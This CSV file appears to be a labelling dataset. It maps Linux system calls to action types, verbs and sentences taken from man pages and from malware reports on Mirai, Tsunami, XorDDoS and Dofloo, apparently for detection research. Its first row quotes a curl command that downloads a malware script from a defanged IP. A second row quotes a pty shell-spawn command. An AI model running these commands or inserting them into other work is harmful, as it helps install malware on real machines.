EntityType,ActionType,Source,Syscall,EnVerb,Sentence
NET,NET_TRANSMIT,Tsunami.Jun,sendto(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
PROC,PROC_EXAM,man,rt_sigaction(),examine,examine and change a signal action
PROC,PROC_EXAM,man,rt_sigaction(),change,examine and change a signal action
PROC,PROC_EXAM,man,rt_sigpending(),examine,examine pending signals
PROC,PROC_EXAM,man,rt_sigprocmask(),examine,examine and change blocked signals
PROC,PROC_EXAM,man,rt_sigprocmask(),change,examine and change blocked signals
PROC,PROC_EXAM,man,sigaction(),examine,examine and change a signal action
PROC,PROC_EXAM,man,sigaction(),change,examine and change a signal action
PROC,PROC_EXAM,man,sigpending(),examine,examine pending signals
PROC,PROC_EXAM,man,sigprocmask(),examine,examine and change blocked signals
PROC,PROC_EXAM,man,sigprocmask(),change,examine and change blocked signals
PROC,PROC_EXE,man,clone(),create,create a child process
PROC,PROC_EXE,Mirai.Impera,clone(),use,Mirai uses a brute force technique for guessing passwords a.k.a. dictionary attacks based on the following list:
PROC,PROC_EXE,Xorddos.Intezer,clone(),call,RedXOR uses an open-source LKM rootkit called “Adore-ng” to hide its process.
PROC,PROC_EXE,Dofloo.Mal,clone(),spawn,"We'll see 3 thread will be spawned, which using ""/dev/null"" as value, this is typical MO for most types of AES.DDoS'ers we saw."
PROC,PROC_EXE,Mirai.Mal,clone(),fork,Then this main process will exit here. and forked to new process PID (note: If you go this far means the malware can infect your system).
PROC,PROC_EXE,Xorddos.Micro,clone(),perform,method involves running a bash script that performs the following activities via the command line:
PROC,PROC_EXE,Tsunami.Cado,clone(),install,And the kinsing malware itself was installed at /etc/kinsing
PROC,PROC_EXE,Tsunami.Aquasec,clone(),add,SSH brute-force tool – the attacker added a new tool called hxx (md5=f0551696774f66ad3485445d9e3f7214)
PROC,PROC_EXE,Xorddos.Micro,clone(),start,The commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.
PROC,PROC_EXE,man,exec(),execute,executes the program referred to by pathname
PROC,PROC_EXE,man,exec(),replace,replaces the current process image with a new process image.
PROC,PROC_EXE,man,execve(),execute,execute program
PROC,PROC_EXE,Dofloo.Syscall,execve(),use,the malware constructs a shell command and then uses the system function to execute them
PROC,PROC_EXE,Dofloo.Mal,execve(),call,This is the function to be called when performing DoS by HTTP
PROC,PROC_EXE,Xorddos.Intezer,execve(),spawn,"In the new spawned shell, the malware executes python -c “import pty;pty.spawn(‘/bin/sh’)” to get a pseudo-terminal (pty) interface."
PROC,PROC_EXE,Dofloo.Syscall,execve(),fork,The process then forks itself and breaks away from its parent by calling setsid(..).
PROC,PROC_EXE,Xorddos.Intezer,execve(),perform,The JSESSIONID value holds the command ID for the job the C2 wants the malware to perform.
PROC,PROC_EXE,Dofloo.Security,execve(),install,"we saw that an attacker was able to exploit CVE-2019-3396 to infect machines with the AESDDoS botnet malware.” reads the analysis published by Trend Micro. “A shell command was remotely executed to download and execute a malicious shell script (Trojan.SH.LODEX.J), which in turn downloaded another shell script (Trojan.SH.DOGOLOAD.J) that finally installed the AESDDoS botnet malware on the affected system."
PROC,PROC_EXE,Dofloo.Syscall,execve(),add,Persistence is achieved by the malware by adding to /etc/rc.local
PROC,PROC_EXE,Mirai.Mal,execve(),start,bind it to the specific port (not random) TCP/48101 from localhost IP address 127.0.0.1 and then starting to listen to the incoming connection:
PROC,PROC_EXE,man,execveat(),execute,execute program relative to a directory file descriptor
PROC,PROC_EXE,man,fork(),create,create a child process
PROC,PROC_EXE,Mirai.Impera,fork(),use,Mirai uses a brute force technique for guessing passwords a.k.a. dictionary attacks based on the following list:
PROC,PROC_EXE,Xorddos.Intezer,fork(),call,RedXOR uses an open-source LKM rootkit called “Adore-ng” to hide its process.
PROC,PROC_EXE,Dofloo.Mal,fork(),spawn,"We'll see 3 thread will be spawned, which using ""/dev/null"" as value, this is typical MO for most types of AES.DDoS'ers we saw."
PROC,PROC_EXE,Mirai.Mal,fork(),fork,Then this main process will exit here. and forked to new process PID (note: If you go this far means the malware can infect your system).
PROC,PROC_EXE,Xorddos.Micro,fork(),perform,method involves running a bash script that performs the following activities via the command line:
PROC,PROC_EXE,Tsunami.Cado,fork(),install,And the kinsing malware itself was installed at /etc/kinsing
PROC,PROC_EXE,Tsunami.Aquasec,fork(),add,SSH brute-force tool – the attacker added a new tool called hxx (md5=f0551696774f66ad3485445d9e3f7214)
PROC,PROC_EXE,Xorddos.Micro,fork(),start,The commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.
PROC,PROC_EXE,man,personality(),set,set the process execution domain
PROC,PROC_EXE,man,restart_syscall(),restart,restart a system call after interruption by a stop signal
PROC,PROC_EXE,man,unshare(),disassociate,disassociate parts of the process execution context
PROC,PROC_EXE,man,vfork(),create,create a child process and block parent
PROC,PROC_EXE,Mirai.Impera,vfork(),use,Mirai uses a brute force technique for guessing passwords a.k.a. dictionary attacks based on the following list:
PROC,PROC_EXE,Xorddos.Intezer,vfork(),call,RedXOR uses an open-source LKM rootkit called “Adore-ng” to hide its process.
PROC,PROC_EXE,Dofloo.Mal,vfork(),spawn,"We'll see 3 thread will be spawned, which using ""/dev/null"" as value, this is typical MO for most types of AES.DDoS'ers we saw."
PROC,PROC_EXE,Mirai.Mal,vfork(),fork,Then this main process will exit here. and forked to new process PID (note: If you go this far means the malware can infect your system).
PROC,PROC_EXE,Xorddos.Micro,vfork(),perform,method involves running a bash script that performs the following activities via the command line:
PROC,PROC_EXE,Tsunami.Cado,vfork(),install,And the kinsing malware itself was installed at /etc/kinsing
PROC,PROC_EXE,Tsunami.Aquasec,vfork(),add,SSH brute-force tool – the attacker added a new tool called hxx (md5=f0551696774f66ad3485445d9e3f7214)
PROC,PROC_EXE,Xorddos.Micro,vfork(),start,The commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.
PROC,PROC_GET,man,getrandom(),obtain,obtain a series of random bytes
PROC,PROC_GET,man,query_module(),query,query the kernel for various bits pertaining to modules
PROC,PROC_GET,man,rt_sigreturn(),return,return from signal handler and cleanup stack frame
PROC,PROC_GET,man,sched_rr_get_interval(),get,get the SCHED_RR interval for the named process
PROC,PROC_GET,man,sigreturn(),return,return from signal handler and cleanup stack frame
PROC,PROC_GET,man,timer_getoverrun(),get,get overrun count for a POSIX per
PROC,PROC_KILL,man,exit(),terminate,terminate the calling process
PROC,PROC_KILL,man,exit_group(),exit,exit all threads in a process
PROC,PROC_KILL,Tsunami.Trend,exit_group(),kill,Kill all current packeting.
PROC,PROC_KILL,Tsunami.Aquasec,exit_group(),end,"this fallback function also checks if cron, crond, and atd are active. if the first two work, then the function ends."
PROC,PROC_KILL,man,kill(),send,send signal to a process
PROC,PROC_KILL,Tsunami.Unit42,kill(),kill,"It then kills all Telnet and SSH related processes, and connects with a C2 server to receive further commands."
PROC,PROC_KILL,Tsunami.Aquasec,kill(),end,"this fallback function also checks if cron, crond, and atd are active. if the first two work, then the function ends."
PROC,PROC_KILL,man,tgkill(),send,send a signal to a thread
PROC,PROC_KILL,man,tkill(),send,send a signal to a thread
PROC,PROC_LOAD,man,delete_module(),unload,unload a kernel module
PROC,PROC_LOAD,man,finit_module(),load,load a kernel module
PROC,PROC_LOAD,man,init_module(),load,load a kernel module
PROC,PROC_LOAD,man,uselib(),shared,load shared library
PROC,PROC_MEM,man,get_mempolicy(),retrieve,retrieve NUMA memory policy for a thread
PROC,PROC_MEM,man,mbind(),set,set memory policy for a memory range
PROC,PROC_MEM,man,mlock(),lock,lock and unlock memory
PROC,PROC_MEM,man,mlock2(),lock,lock and unlock memory
PROC,PROC_MEM,man,mlockall(),lock,lock and unlock memory
PROC,PROC_MEM,man,munlock(),lock,lock and unlock memory
PROC,PROC_MEM,man,munlockall(),lock,lock and unlock memory
PROC,PROC_MEM,man,pkey_mprotect(),set,set protection on a region of memory
PROC,PROC_MEM,man,set_mempolicy(),set,set default NUMA memory policy for a thread and its children
PROC,PROC_MEM,man,shmat(),attach,shmat() attaches the shared memory segment identified by shmid to the address space of the calling process.
PROC,PROC_MEM,man,shmdt(),attach,shmat() attaches the shared memory segment identified by shmid to the address space of the calling process.
PROC,PROC_MEM,man,shmget(),allocate,allocates a shared memory segment
PROC,PROC_OTHER,man,arch_prctl(),set,set architecture-specific thread state
PROC,PROC_OTHER,man,bdflush(),start,"start, flush, or tune buffer"
PROC,PROC_OTHER,man,bpf(),perform,perform a command on an extended BPF map or program
PROC,PROC_OTHER,man,brk(),change,change data segment size
PROC,PROC_OTHER,man,create_module(),create,create a loadable module entry
PROC,PROC_OTHER,man,futex(),wait,"The futex() system call provides a method for a program to wait for a value at a given address to change, and a method to wake up anyone waiting on a particular address"
PROC,PROC_OTHER,man,futex(),wake,"The futex() system call provides a method for a program to wait for a value at a given address to change, and a method to wake up anyone waiting on a particular address"
PROC,PROC_OTHER,man,kcmp(),compare,compare two processes to determine if they share a kernel resource
PROC,PROC_OTHER,man,migrate_pages(),move,move all pages in a process to another set of nodes
PROC,PROC_OTHER,man,mincore(),determine,determine whether pages are resident in memory
PROC,PROC_OTHER,man,move_pages(),move,move individual pages of a process to another node
PROC,PROC_OTHER,man,mprotect(),set,set protection on a region of memory
PROC,PROC_OTHER,man,mremap(),remap,remap a virtual memory address
PROC,PROC_OTHER,man,nanosleep(),suspend,nanosleep() suspends the execution
PROC,PROC_OTHER,Xorddos.Intezer,nanosleep(),sleep,The malware sleeps and tries to obtain the lock on the file again when it wakes up.
PROC,PROC_OTHER,man,pkey_alloc(),allocate,allocate or free a protection key
PROC,PROC_OTHER,man,pkey_free(),allocate,allocate or free a protection key
PROC,PROC_OTHER,man,process_vm_readv(),transfer,transfer data between process address spaces
PROC,PROC_OTHER,man,process_vm_writev(),transfer,transfer data between process address spaces
PROC,PROC_OTHER,man,sched_yield(),yield,yield the processor
PROC,PROC_OTHER,man,seccomp(),operate,operate on Secure Computing state of the process
PROC,PROC_OTHER,man,set_robust_list(),set,set list of robust futexes
PROC,PROC_OTHER,man,set_thread_area(),set,set a thread local storage (TLS) area
PROC,PROC_OTHER,man,set_tid_address(),set,set pointer to thread ID
PROC,PROC_OTHER,man,timer_create(),create,create a POSIX per
PROC,PROC_OTHER,man,timer_delete(),delete,delete a POSIX per
PROC,PROC_OTHER,man,timer_gettime(),fetch,arm/disarm and fetch state of POSIX per
PROC,PROC_OTHER,man,vm86(),enter,enter virtual 8086 mode
PROC,PROC_SET,man,alarm(),set,set an alarm clock for delivery of a signal
PROC,PROC_SET,man,capget(),get,set/get capabilities of thread(s)
PROC,PROC_SET,man,capset(),set,set/get capabilities of thread(s)
PROC,PROC_SET,man,get_robust_list(),get,get/set list of robust futexes
PROC,PROC_SET,man,getitimer(),get,get or set value of an interval timer
PROC,PROC_SET,man,ioprio_get(),get,get/set I/O scheduling class and priority
PROC,PROC_SET,man,ioprio_set(),set,get/set I/O scheduling class and priority
PROC,PROC_SET,man,sched_getaffinity(),get,set and get a thread's CPU affinity mask
PROC,PROC_SET,man,sched_getattr(),get,set and get scheduling policy and attributes
PROC,PROC_SET,man,sched_getparam(),get,set and get scheduling parameters
PROC,PROC_SET,man,sched_getscheduler(),get,set and get scheduling policy/parameters
PROC,PROC_SET,man,sched_setaffinity(),set,set and get a thread's CPU affinity mask
PROC,PROC_SET,man,sched_setattr(),set,set and get scheduling policy and attributes
PROC,PROC_SET,man,sched_setparam(),set,set and get scheduling parameters
PROC,PROC_SET,man,sched_setscheduler(),set,set and get scheduling policy/parameters
PROC,PROC_SET,man,setitimer(),set,get or set value of an interval timer
PROC,PROC_SET,man,setns(),reassociate,reassociate thread with a namespace
PROC,PROC_SET,man,sigaltstack(),set,set and/or get signal stack context
PROC,PROC_SET,man,sigaltstack(),get,set and/or get signal stack context
PROC,PROC_SET,man,timer_settime(),fetch,arm/disarm and fetch state of POSIX per
PROC,PROC_TRACE,man,ptrace(),trace,process trace
PROC,PROC_TRACE,man,ptrace(),observe,"The ptrace() system call provides a means by which one process (the ""tracer"") may observe and control the execution of another process"
PROC,PROC_TRACE,man,ptrace(),control,"The ptrace() system call provides a means by which one process (the ""tracer"") may observe and control the execution of another process"
PROC,PROC_TRACE,man,ptrace(),examine,examine and change the tracee's memory and registers.
PROC,PROC_TRACE,man,ptrace(),change,examine and change the tracee's memory and registers.
PROC,PROC_WAIT,man,idle(),make,make process 0 idle
PROC,PROC_WAIT,man,pause(),wait,wait for signal
PROC,PROC_WAIT,man,rt_sigsuspend(),wait,wait for a signal
PROC,PROC_WAIT,man,rt_sigtimedwait(),wait,synchronously wait for queued signals
PROC,PROC_WAIT,man,sigsuspend(),wait,wait for a signal
PROC,PROC_WAIT,man,wait4(),wait,"wait for process to change state, BSD style"
PROC,PROC_WAIT,man,waitid(),wait,wait for process to change state
PROC,PROC_WAIT,man,waitpid(),wait,wait for process to change state
TIME,TIME_GET,man,gettimeofday(),get,get / set time
TIME,TIME_GET,man,time(),get,get time in seconds
TIME,TIME_GET,man,times(),get,get process times
TIME,TIME_SET,man,settimeofday(),set,get / set time
TIME,TIME_SET,man,stime(),set,set time
